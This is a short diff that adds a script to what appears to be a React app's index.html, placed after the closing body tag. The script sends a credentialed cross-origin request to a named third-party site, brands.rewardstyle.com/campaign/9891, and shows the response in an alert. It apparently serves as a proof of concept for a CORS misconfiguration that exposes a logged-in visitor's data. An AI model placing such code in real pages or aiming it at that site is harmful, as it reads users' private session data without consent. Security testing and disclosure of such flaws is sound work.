@@ -40,4 +40,15 @@
       To create a production bundle, use `npm run build` or `yarn build`.
     -->
   </body>
+  <script>
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      alert(xhttp.responseText);
+    }
+  };
+  xhttp.open("GET", "https://brands.rewardstyle.com/campaign/9891", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+</script>
 </html>
